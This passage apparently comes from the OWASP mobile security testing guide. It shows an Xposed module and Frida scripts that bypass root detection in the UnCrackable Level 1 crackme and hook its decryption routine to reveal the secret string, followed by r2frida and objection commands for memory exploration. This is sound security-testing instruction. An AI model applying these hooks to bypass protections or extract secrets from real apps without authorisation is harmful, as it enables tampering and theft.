    \KeywordTok{for}\NormalTok{(}\DataTypeTok{int}\NormalTok{ v3 = }\DecValTok{0}\NormalTok{; v3 < v2; v3++) \{}
      \KeywordTok{if}\NormalTok{(}\KeywordTok{new} \BuiltInTok{File}\NormalTok{(}\BuiltInTok{String}\NormalTok{.}\FunctionTok{valueOf}\NormalTok{(v1[v3]) + }\StringTok{"su"}\NormalTok{).}\FunctionTok{exists}\NormalTok{()) \{}
\NormalTok{         v0 = }\KeywordTok{true}\NormalTok{;}
         \KeywordTok{return}\NormalTok{ v0;}
\NormalTok{      \}}
\NormalTok{    \}}

    \KeywordTok{return}\NormalTok{ v0;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

This method iterates through a list of directories and returns
\texttt{true} (device rooted) if it finds the \texttt{su} binary in any
of them. Checks like this are easy to deactivate all you have to do is
replace the code with something that returns ``false''. Method hooking
with an Xposed module is one way to do this (see ``Android Basic
Security Testing'' for more details on Xposed installation and basics).

The method \texttt{XposedHelpers.findAndHookMethod} allows you to
override existing class methods. By inspecting the decompiled source
code, you can find out that the method performing the check is
\texttt{c}. This method is located in the class
\texttt{com.example.a.b}. The following is an Xposed module that
overrides the function so that it always returns false:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\ImportTok{ com.awesome.pentestcompany;}

\KeywordTok{import static}\ImportTok{ de.robv.android.xposed.XposedHelpers.findAndHookMethod;}
\KeywordTok{import}\ImportTok{ de.robv.android.xposed.IXposedHookLoadPackage;}
\KeywordTok{import}\ImportTok{ de.robv.android.xposed.XposedBridge;}
\KeywordTok{import}\ImportTok{ de.robv.android.xposed.XC\_MethodHook;}
\KeywordTok{import}\ImportTok{ de.robv.android.xposed.callbacks.XC\_LoadPackage.LoadPackageParam;}

\KeywordTok{public} \KeywordTok{class}\NormalTok{ DisableRootCheck }\KeywordTok{implements}\NormalTok{ IXposedHookLoadPackage \{}

    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{handleLoadPackage}\NormalTok{(}\DataTypeTok{final}\NormalTok{ LoadPackageParam lpparam) }\KeywordTok{throws} \BuiltInTok{Throwable}\NormalTok{ \{}
        \KeywordTok{if}\NormalTok{ (!lpparam.}\FunctionTok{packageName}\NormalTok{.}\FunctionTok{equals}\NormalTok{(}\StringTok{"com.example.targetapp"}\NormalTok{))}
            \KeywordTok{return}\NormalTok{;}

        \FunctionTok{findAndHookMethod}\NormalTok{(}\StringTok{"com.example.a.b"}\NormalTok{, lpparam.}\FunctionTok{classLoader}\NormalTok{, }\StringTok{"c"}\NormalTok{, }\KeywordTok{new} \FunctionTok{XC\_MethodHook}\NormalTok{() \{}
            \AttributeTok{@Override}

            \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{beforeHookedMethod}\NormalTok{(MethodHookParam param) }\KeywordTok{throws} \BuiltInTok{Throwable}\NormalTok{ \{}
\NormalTok{                XposedBridge.}\FunctionTok{log}\NormalTok{(}\StringTok{"Caught root check!"}\NormalTok{);}
\NormalTok{                param.}\FunctionTok{setResult}\NormalTok{(}\KeywordTok{false}\NormalTok{);}
\NormalTok{            \}}

\NormalTok{        \});}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Just like regular Android apps, modules for Xposed are developed and
deployed with Android Studio. For more details on writing, compiling,
and installing Xposed modules, refer to the tutorial provided by its
author,
\href{https://www.xda-developers.com/rovo89-updates-on-the-situation-regarding-xposed-for-nougat/}{rovo89}.

Frida

We'll use Frida to solve the UnCrackable App for Android Level 1 and
demonstrate how we can easily bypass root detection and extract secret
data from the app.

When you start the crackme app on an emulator or a rooted device, you'll
find that the it presents a dialog box and exits as soon as you press
``OK'' because it detected root:

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/65d9911c121984364aa4dd59d11f9e12cbaba7b1.png}
\caption{Crackme Root Detected Dialog}
\end{figure}

Let's see how we can prevent this.

The main method (decompiled with CFR) looks like this:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\ImportTok{ sg.vantagepoint.uncrackable1;}

\KeywordTok{import}\ImportTok{ android.app.Activity;}
\KeywordTok{import}\ImportTok{ android.app.AlertDialog;}
\KeywordTok{import}\ImportTok{ android.content.Context;}
\KeywordTok{import}\ImportTok{ android.content.DialogInterface;}
\KeywordTok{import}\ImportTok{ android.os.Bundle;}
\KeywordTok{import}\ImportTok{ android.text.Editable;}
\KeywordTok{import}\ImportTok{ android.view.View;}
\KeywordTok{import}\ImportTok{ android.widget.EditText;}
\KeywordTok{import}\ImportTok{ sg.vantagepoint.a.b;}
\KeywordTok{import}\ImportTok{ sg.vantagepoint.a.c;}
\KeywordTok{import}\ImportTok{ sg.vantagepoint.uncrackable1.a;}

\KeywordTok{public} \KeywordTok{class}\NormalTok{ MainActivity}
\KeywordTok{extends}\NormalTok{ Activity \{}
    \KeywordTok{private} \DataTypeTok{void} \FunctionTok{a}\NormalTok{(}\BuiltInTok{String}\NormalTok{ string) \{}
\NormalTok{        AlertDialog alertDialog = }\KeywordTok{new}\NormalTok{ AlertDialog.}\FunctionTok{Builder}\NormalTok{((}\BuiltInTok{Context}\NormalTok{)}\KeywordTok{this}\NormalTok{).}\FunctionTok{create}\NormalTok{();}
\NormalTok{        alertDialog.}\FunctionTok{setTitle}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)string);}
\NormalTok{        alertDialog.}\FunctionTok{setMessage}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"This is unacceptable. The app is now going to exit."}\NormalTok{);}
\NormalTok{        alertDialog.}\FunctionTok{setButton}\NormalTok{({-}}\DecValTok{3}\NormalTok{, (}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"OK"}\NormalTok{, }\KeywordTok{new}\NormalTok{ DialogInterface.}\FunctionTok{OnClickListener}\NormalTok{()\{}

            \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onClick}\NormalTok{(DialogInterface dialogInterface, }\DataTypeTok{int}\NormalTok{ n) \{}
                \BuiltInTok{System}\NormalTok{.}\FunctionTok{exit}\NormalTok{((}\DataTypeTok{int}\NormalTok{)}\DecValTok{0}\NormalTok{);}
\NormalTok{            \}}
\NormalTok{        \});}
\NormalTok{        alertDialog.}\FunctionTok{setCancelable}\NormalTok{(}\KeywordTok{false}\NormalTok{);}
\NormalTok{        alertDialog.}\FunctionTok{show}\NormalTok{();}
\NormalTok{    \}}

    \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{(Bundle bundle) \{}
        \KeywordTok{if}\NormalTok{ (c.}\FunctionTok{a}\NormalTok{() || c.}\FunctionTok{b}\NormalTok{() || c.}\FunctionTok{c}\NormalTok{()) \{}
            \KeywordTok{this}\NormalTok{.}\FunctionTok{a}\NormalTok{(}\StringTok{"Root detected!"}\NormalTok{);}
\NormalTok{        \}}
        \KeywordTok{if}\NormalTok{ (b.}\FunctionTok{a}\NormalTok{(}\KeywordTok{this}\NormalTok{.}\FunctionTok{getApplicationContext}\NormalTok{())) \{}
            \KeywordTok{this}\NormalTok{.}\FunctionTok{a}\NormalTok{(}\StringTok{"App is debuggable!"}\NormalTok{);}
\NormalTok{        \}}
        \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(bundle);}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{setContentView}\NormalTok{(}\DecValTok{2130903040}\NormalTok{);}
\NormalTok{    \}}

    \CommentTok{/*}
\CommentTok{     * Enabled aggressive block sorting}
\CommentTok{     */}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{verify}\NormalTok{(}\BuiltInTok{View}\NormalTok{ object) \{}
\NormalTok{        object = ((EditText)}\KeywordTok{this}\NormalTok{.}\FunctionTok{findViewById}\NormalTok{(}\DecValTok{2130837505}\NormalTok{)).}\FunctionTok{getText}\NormalTok{().}\FunctionTok{toString}\NormalTok{();}
\NormalTok{        AlertDialog alertDialog = }\KeywordTok{new}\NormalTok{ AlertDialog.}\FunctionTok{Builder}\NormalTok{((}\BuiltInTok{Context}\NormalTok{)}\KeywordTok{this}\NormalTok{).}\FunctionTok{create}\NormalTok{();}
        \KeywordTok{if}\NormalTok{ (a.}\FunctionTok{a}\NormalTok{((}\BuiltInTok{String}\NormalTok{)object)) \{}
\NormalTok{            alertDialog.}\FunctionTok{setTitle}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"Success!"}\NormalTok{);}
\NormalTok{            object = }\StringTok{"This is the correct secret."}\NormalTok{;}
\NormalTok{        \} }\KeywordTok{else}\NormalTok{ \{}
\NormalTok{            alertDialog.}\FunctionTok{setTitle}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"Nope..."}\NormalTok{);}
\NormalTok{            object = }\StringTok{"That\textquotesingle{}s not it. Try again."}\NormalTok{;}
\NormalTok{        \}}
\NormalTok{        alertDialog.}\FunctionTok{setMessage}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)object);}
\NormalTok{        alertDialog.}\FunctionTok{setButton}\NormalTok{({-}}\DecValTok{3}\NormalTok{, (}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"OK"}\NormalTok{, }\KeywordTok{new}\NormalTok{ DialogInterface.}\FunctionTok{OnClickListener}\NormalTok{()\{}

            \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onClick}\NormalTok{(DialogInterface dialogInterface, }\DataTypeTok{int}\NormalTok{ n) \{}
\NormalTok{                dialogInterface.}\FunctionTok{dismiss}\NormalTok{();}
\NormalTok{            \}}
\NormalTok{        \});}
\NormalTok{        alertDialog.}\FunctionTok{show}\NormalTok{();}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Notice the ``Root detected'' message in the \texttt{onCreate} method and
the various methods called in the preceding \texttt{if}-statement (which
perform the actual root checks). Also note the ``This is
unacceptable\ldots{}'' message from the first method of the class,
\texttt{private\ void\ a}. Obviously, this method displays the dialog
box. There is an \texttt{alertDialog.onClickListener} callback set in
the \texttt{setButton} method call, which closes the application via
\texttt{System.exit} after successful root detection. With Frida, you
can prevent the app from exiting by hooking the \texttt{MainActivity.a}
method or the callback inside it. The example below shows how you can
hook \texttt{MainActivity.a} and prevent it from ending the application.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{setImmediate}\NormalTok{(}\KeywordTok{function}\NormalTok{() }\OperatorTok{\{} \CommentTok{//prevent timeout}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] Starting script"}\NormalTok{)}\OperatorTok{;}

    \VariableTok{Java}\NormalTok{.}\AttributeTok{perform}\NormalTok{(}\KeywordTok{function}\NormalTok{() }\OperatorTok{\{}
      \KeywordTok{var}\NormalTok{ mainActivity }\OperatorTok{=} \VariableTok{Java}\NormalTok{.}\AttributeTok{use}\NormalTok{(}\StringTok{"sg.vantagepoint.uncrackable1.MainActivity"}\NormalTok{)}\OperatorTok{;}
      \VariableTok{mainActivity}\NormalTok{.}\VariableTok{a}\NormalTok{.}\AttributeTok{implementation} \OperatorTok{=} \KeywordTok{function}\NormalTok{(v) }\OperatorTok{\{}
         \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] MainActivity.a called"}\NormalTok{)}\OperatorTok{;}
      \OperatorTok{\};}
      \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] MainActivity.a modified"}\NormalTok{)}\OperatorTok{;}

    \OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

Wrap your code in the function \texttt{setImmediate} to prevent timeouts
(you may or may not need to do this), then call \texttt{Java.perform} to
use Frida's methods for dealing with Java. Afterwards retrieve a wrapper
for \texttt{MainActivity} class and overwrite its \texttt{a} method.
Unlike the original, the new version of \texttt{a} just writes console
output and doesn't exit the app. An alternative solution is to hook
\texttt{onClick} method of the \texttt{OnClickListener} interface. You
can overwrite the \texttt{onClick} method and prevent it from ending the
application with the \texttt{System.exit} call. If you want to inject
your own Frida script, it should either disable the \texttt{AlertDialog}
entirely or change the behavior of the \texttt{onClick} method so the
app does not exit when you click ``OK''.

Save the above script as \texttt{uncrackable1.js} and load it:

\begin{verbatim}
$ frida -U -f owasp.mstg.uncrackable1 -l uncrackable1.js --no-pause
\end{verbatim}

After you see the ``MainActivity.a modified'' message and the app will
not exit anymore.

You can now try to input a ``secret string''. But where do you get it?

If you look at the class \texttt{sg.vantagepoint.uncrackable1.a}, you
can see the encrypted string with which your input gets compared:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\ImportTok{ sg.vantagepoint.uncrackable1;}

\KeywordTok{import}\ImportTok{ android.util.Base64;}
\KeywordTok{import}\ImportTok{ android.util.Log;}

\KeywordTok{public} \KeywordTok{class}\NormalTok{ a \{}
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{a}\NormalTok{(}\BuiltInTok{String}\NormalTok{ string) \{}
        \DataTypeTok{byte}\NormalTok{[] arrby = Base64.}\FunctionTok{decode}\NormalTok{((}\BuiltInTok{String}\NormalTok{)}\StringTok{"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc="}\NormalTok{, (}\DataTypeTok{int}\NormalTok{)}\DecValTok{0}\NormalTok{);}
        \KeywordTok{try}\NormalTok{ \{}
\NormalTok{            arrby = sg.}\FunctionTok{vantagepoint}\NormalTok{.}\FunctionTok{a}\NormalTok{.}\FunctionTok{a}\NormalTok{.}\FunctionTok{a}\NormalTok{(a.}\FunctionTok{b}\NormalTok{(}\StringTok{"8d127684cbc37c17616d806cf50473cc"}\NormalTok{), arrby);}
\NormalTok{        \}}
        \KeywordTok{catch}\NormalTok{ (}\BuiltInTok{Exception}\NormalTok{ exception) \{}
            \BuiltInTok{StringBuilder}\NormalTok{ stringBuilder = }\KeywordTok{new} \BuiltInTok{StringBuilder}\NormalTok{();}
\NormalTok{            stringBuilder.}\FunctionTok{append}\NormalTok{(}\StringTok{"AES error:"}\NormalTok{);}
\NormalTok{            stringBuilder.}\FunctionTok{append}\NormalTok{(exception.}\FunctionTok{getMessage}\NormalTok{());}
\NormalTok{            Log.}\FunctionTok{d}\NormalTok{((}\BuiltInTok{String}\NormalTok{)}\StringTok{"CodeCheck"}\NormalTok{, (}\BuiltInTok{String}\NormalTok{)stringBuilder.}\FunctionTok{toString}\NormalTok{());}
\NormalTok{            arrby = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[]\{\};}
\NormalTok{        \}}
        \KeywordTok{return}\NormalTok{ string.}\FunctionTok{equals}\NormalTok{((}\BuiltInTok{Object}\NormalTok{)}\KeywordTok{new} \BuiltInTok{String}\NormalTok{(arrby));}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{b}\NormalTok{(}\BuiltInTok{String}\NormalTok{ string) \{}
        \DataTypeTok{int}\NormalTok{ n = string.}\FunctionTok{length}\NormalTok{();}
        \DataTypeTok{byte}\NormalTok{[] arrby = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[n / }\DecValTok{2}\NormalTok{];}
        \KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < n; i += }\DecValTok{2}\NormalTok{) \{}
\NormalTok{            arrby[i / }\DecValTok{2}\NormalTok{] = (}\DataTypeTok{byte}\NormalTok{)((}\BuiltInTok{Character}\NormalTok{.}\FunctionTok{digit}\NormalTok{((}\DataTypeTok{char}\NormalTok{)string.}\FunctionTok{charAt}\NormalTok{(i), (}\DataTypeTok{int}\NormalTok{)}\DecValTok{16}\NormalTok{) << }\DecValTok{4}\NormalTok{) + }\BuiltInTok{Character}\NormalTok{.}\FunctionTok{digit}\NormalTok{((}\DataTypeTok{char}\NormalTok{)string.}\FunctionTok{charAt}\NormalTok{(i + }\DecValTok{1}\NormalTok{), (}\DataTypeTok{int}\NormalTok{)}\DecValTok{16}\NormalTok{));}
\NormalTok{        \}}
        \KeywordTok{return}\NormalTok{ arrby;}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Look at the \texttt{string.equals} comparison at the end of the
\texttt{a} method and the creation of the string \texttt{arrby} in the
\texttt{try} block above. \texttt{arrby} is the return value of the
function \texttt{sg.vantagepoint.a.a.a}. \texttt{string.equals}
comparison compares your input with \texttt{arrby}. So we want the
return value of \texttt{sg.vantagepoint.a.a.a.}

Instead of reversing the decryption routines to reconstruct the secret
key, you can simply ignore all the decryption logic in the app and hook
the \texttt{sg.vantagepoint.a.a.a} function to catch its return value.
Here is the complete script that prevents exiting on root and intercepts
the decryption of the secret string:

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{setImmediate}\NormalTok{(}\KeywordTok{function}\NormalTok{() }\OperatorTok{\{} \CommentTok{//prevent timeout}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] Starting script"}\NormalTok{)}\OperatorTok{;}

    \VariableTok{Java}\NormalTok{.}\AttributeTok{perform}\NormalTok{(}\KeywordTok{function}\NormalTok{() }\OperatorTok{\{}
        \KeywordTok{var}\NormalTok{ mainActivity }\OperatorTok{=} \VariableTok{Java}\NormalTok{.}\AttributeTok{use}\NormalTok{(}\StringTok{"sg.vantagepoint.uncrackable1.MainActivity"}\NormalTok{)}\OperatorTok{;}
        \VariableTok{mainActivity}\NormalTok{.}\VariableTok{a}\NormalTok{.}\AttributeTok{implementation} \OperatorTok{=} \KeywordTok{function}\NormalTok{(v) }\OperatorTok{\{}
           \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] MainActivity.a called"}\NormalTok{)}\OperatorTok{;}
        \OperatorTok{\};}
        \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] MainActivity.a modified"}\NormalTok{)}\OperatorTok{;}

        \KeywordTok{var}\NormalTok{ aaClass }\OperatorTok{=} \VariableTok{Java}\NormalTok{.}\AttributeTok{use}\NormalTok{(}\StringTok{"sg.vantagepoint.a.a"}\NormalTok{)}\OperatorTok{;}
        \VariableTok{aaClass}\NormalTok{.}\VariableTok{a}\NormalTok{.}\AttributeTok{implementation} \OperatorTok{=} \KeywordTok{function}\NormalTok{(arg1}\OperatorTok{,}\NormalTok{ arg2) }\OperatorTok{\{}
        \KeywordTok{var}\NormalTok{ retval }\OperatorTok{=} \KeywordTok{this}\NormalTok{.}\AttributeTok{a}\NormalTok{(arg1}\OperatorTok{,}\NormalTok{ arg2)}\OperatorTok{;}
        \KeywordTok{var}\NormalTok{ password }\OperatorTok{=} \StringTok{\textquotesingle{}\textquotesingle{}}\OperatorTok{;}
        \ControlFlowTok{for}\NormalTok{(}\KeywordTok{var}\NormalTok{ i }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}\NormalTok{ i }\OperatorTok{<} \VariableTok{retval}\NormalTok{.}\AttributeTok{length}\OperatorTok{;}\NormalTok{ i}\OperatorTok{++}\NormalTok{) }\OperatorTok{\{}
\NormalTok{            password }\OperatorTok{+=} \VariableTok{String}\NormalTok{.}\AttributeTok{fromCharCode}\NormalTok{(retval[i])}\OperatorTok{;}
        \OperatorTok{\}}

        \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] Decrypted: "} \OperatorTok{+}\NormalTok{ password)}\OperatorTok{;}
            \ControlFlowTok{return}\NormalTok{ retval}\OperatorTok{;}
        \OperatorTok{\};}
        \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] sg.vantagepoint.a.a.a modified"}\NormalTok{)}\OperatorTok{;}
    \OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

After running the script in Frida and seeing the ``{[}*{]}
sg.vantagepoint.a.a.a modified'' message in the console, enter a random
value for ``secret string'' and press verify. You should get an output
similar to the following:

\begin{verbatim}
$ frida -U -f owasp.mstg.uncrackable1 -l uncrackable1.js --no-pause

[*] Starting script
[USB::Android Emulator 5554::sg.vantagepoint.uncrackable1]-> [*] MainActivity.a modified
[*] sg.vantagepoint.a.a.a modified
[*] MainActivity.a called.
[*] Decrypted: I want to believe
\end{verbatim}

The hooked function outputted the decrypted string. You extracted the
secret string without having to dive too deep into the application code
and its decryption routines.

You've now covered the basics of static/dynamic analysis on Android. Of
course, the only way to \emph{really} learn it is hands-on experience:
build your own projects in Android Studio, observe how your code gets
translated into bytecode and native code, and try to crack our
challenges.

In the remaining sections, we'll introduce a few advanced subjects,
including process exploration, kernel modules and dynamic execution.

\hypertarget{process-exploration}{%
\subparagraph{Process Exploration}\label{process-exploration}}

When testing an app, process exploration can provide the tester with
deep insights into the app process memory. It can be achieved via
runtime instrumentation and allows to perform tasks such as:

\begin{itemize}
\tightlist
\item
  Retrieving the memory map and loaded libraries.
\item
  Searching for occurrences of certain data.
\item
  After doing a search, obtaining the location of a certain offset in
  the memory map.
\item
  Performing a memory dump and inspect or reverse engineer the binary
  data \emph{offline}.
\item
  Reverse engineering a native library while it's running.
\end{itemize}

As you can see, these passive tasks help us collect information. This
Information is often used for other techniques, such as method hooking.

In the following sections you will be using r2frida to retrieve
information straight from the app runtime. Please refer to
\href{https://github.com/nowsecure/r2frida/blob/master/README.md\#installation}{r2frida's
official installation instructions}. First start by opening an r2frida
session to the target app
(e.g.~\href{https://github.com/OWASP/owasp-mstg/raw/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk}{HelloWorld
JNI} APK) that should be running on your Android phone (connected per
USB). Use the following command:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2}\NormalTok{ frida://usb//sg.vantagepoint.helloworldjni}
\end{Highlighting}
\end{Shaded}

\begin{quote}
See all options with \texttt{r2\ frida://?}.
\end{quote}

Once in the r2frida session, all commands start with
\texttt{\textbackslash{}}. For example, in radare2 you'd run \texttt{i}
to display the binary information, but in r2frida you'd use
\texttt{\textbackslash{}i}.

Memory Maps and Inspection

You can retrieve the app's memory maps by running
\texttt{\textbackslash{}dm}, The output in Android can get very long
(e.g.~between 1500 and 2000 lines), to narrow your search and see only
what directly belongs to the app apply a grep
(\texttt{\textasciitilde{}}) by package name
\texttt{\textbackslash{}dm\textasciitilde{}\textless{}package\_name\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm\textasciitilde{}sg.vantagepoint.helloworldjni}
\ExtensionTok{0x000000009b2dc000}\NormalTok{ {-} 0x000000009b361000 rw{-} /dev/ashmem/dalvik{-}/data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.art (deleted)}
\ExtensionTok{0x000000009b361000}\NormalTok{ {-} 0x000000009b36e000 {-}{-}{-} /dev/ashmem/dalvik{-}/data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.art (deleted)}
\ExtensionTok{0x000000009b36e000}\NormalTok{ {-} 0x000000009b371000 rw{-} /dev/ashmem/dalvik{-}/data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.art (deleted)}
\ExtensionTok{0x0000007d103be000}\NormalTok{ {-} 0x0000007d10686000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.vdex}
\ExtensionTok{0x0000007d10dd0000}\NormalTok{ {-} 0x0000007d10dee000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.odex}
\ExtensionTok{0x0000007d10dee000}\NormalTok{ {-} 0x0000007d10e2b000 r{-}x /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.odex}
\ExtensionTok{0x0000007d10e3a000}\NormalTok{ {-} 0x0000007d10e3b000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.odex}
\ExtensionTok{0x0000007d10e3b000}\NormalTok{ {-} 0x0000007d10e3c000 rw{-} /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.odex}
\ExtensionTok{0x0000007d1c499000}\NormalTok{ {-} 0x0000007d1c49a000 r{-}x /data/app/sg.vantagepoint.helloworldjni{-}1/lib/arm64/libnative{-}lib.so}
\ExtensionTok{0x0000007d1c4a9000}\NormalTok{ {-} 0x0000007d1c4aa000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/lib/arm64/libnative{-}lib.so}
\ExtensionTok{0x0000007d1c4aa000}\NormalTok{ {-} 0x0000007d1c4ab000 rw{-} /data/app/sg.vantagepoint.helloworldjni{-}1/lib/arm64/libnative{-}lib.so}
\ExtensionTok{0x0000007d1c516000}\NormalTok{ {-} 0x0000007d1c54d000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/base.apk}
\ExtensionTok{0x0000007dbd23c000}\NormalTok{ {-} 0x0000007dbd247000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/base.apk}
\ExtensionTok{0x0000007dc05db000}\NormalTok{ {-} 0x0000007dc05dc000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/oat/arm64/base.art}
\end{Highlighting}
\end{Shaded}

While you're searching or exploring the app memory, you can always
verify where you're located in each moment (where your current offset is
located) in the memory map. Instead of noting and searching for the
memory address in this list you can simply run
\texttt{\textbackslash{}dm.}. You'll find an example in the following
section ``In-Memory Search''.

If you're only interested into the modules (binaries and libraries) that
the app has loaded, you can use the command \texttt{\textbackslash{}il}
to list them all:

\begin{verbatim}
[0x00000000]> \il
0x000000558b1fd000 app_process64
0x0000007dbc859000 libandroid_runtime.so
0x0000007dbf5d7000 libbinder.so
0x0000007dbff4d000 libcutils.so
0x0000007dbfd13000 libhwbinder.so
0x0000007dbea00000 liblog.so
0x0000007dbcf17000 libnativeloader.so
0x0000007dbf21c000 libutils.so
0x0000007dbde4b000 libc++.so
0x0000007dbe09b000 libc.so
...
0x0000007d10dd0000 base.odex
0x0000007d1c499000 libnative-lib.so
0x0000007d2354e000 frida-agent-64.so
0x0000007dc065d000 linux-vdso.so.1
0x0000007dc065f000 linker64
\end{verbatim}

As you might expect you can correlate the addresses of the libraries
with the memory maps: e.g.~the native library of the app is located at
\texttt{0x0000007d1c499000} and optimized dex (base.odex) at
\texttt{0x0000007d10dd0000}.

You can also use objection to display the same information.

\begin{verbatim}
$ objection --gadget sg.vantagepoint.helloworldjni explore

sg.vantagepoint.helloworldjni on (google: 8.1.0) [usb] # memory list modules
Save the output by adding `--json modules.json` to this command

Name                                             Base          Size                  Path
-----------------------------------------------  ------------  --------------------  --------------------------------------------------------------------
app_process64                                    0x558b1fd000  32768 (32.0 KiB)      /system/bin/app_process64
libandroid_runtime.so                            0x7dbc859000  1982464 (1.9 MiB)     /system/lib64/libandroid_runtime.so
libbinder.so                                     0x7dbf5d7000  557056 (544.0 KiB)    /system/lib64/libbinder.so
libcutils.so                                     0x7dbff4d000  77824 (76.0 KiB)      /system/lib64/libcutils.so
libhwbinder.so                                   0x7dbfd13000  163840 (160.0 KiB)    /system/lib64/libhwbinder.so
base.odex                                        0x7d10dd0000  442368 (432.0 KiB)    /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex
libnative-lib.so                                 0x7d1c499000  73728 (72.0 KiB)      /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so
\end{verbatim}

You can even directly see the size and the path to that binary in the
Android file system.

In-Memory Search

In-memory search is a very useful technique to test for sensitive data
that might be present in the app memory.

See r2frida's help on the search command (\texttt{\textbackslash{}/?})
to learn about the search command and get a list of options. The
following shows only a subset of them:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/?}
 \ExtensionTok{/}\NormalTok{      search}
 \ExtensionTok{/j}\NormalTok{     search json}
 \ExtensionTok{/w}\NormalTok{     search wide}
 \ExtensionTok{/wj}\NormalTok{    search wide json}
 \ExtensionTok{/x}\NormalTok{     search hex}
 \ExtensionTok{/xj}\NormalTok{    search hex json}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

You can adjust your search by using the search settings
\texttt{\textbackslash{}e\textasciitilde{}search}. For example,
\texttt{\textbackslash{}e\ search.quiet=true;} will print only the
results and hide search progress:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}e\textasciitilde{}search}
\ExtensionTok{e}\NormalTok{ search.in=perm:r{-}{-}}
\ExtensionTok{e}\NormalTok{ search.quiet=false}
\end{Highlighting}
\end{Shaded}

For now, we'll continue with the defaults and concentrate on string
search. This app is actually very simple, it loads the string ``Hello
from C++'' from its native library and displays it to us. You can start
by searching for ``Hello'' and see what r2frida finds:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/ Hello}
\ExtensionTok{Searching}\NormalTok{ 5 bytes: 48 65 6c 6c 6f}
\ExtensionTok{...}
\ExtensionTok{hits}\NormalTok{: 11}
\ExtensionTok{0x13125398}\NormalTok{ hit0\_0 HelloWorldJNI}
\ExtensionTok{0x13126b90}\NormalTok{ hit0\_1 Hello World!}
\ExtensionTok{0x1312e220}\NormalTok{ hit0\_2 Hello from C++}
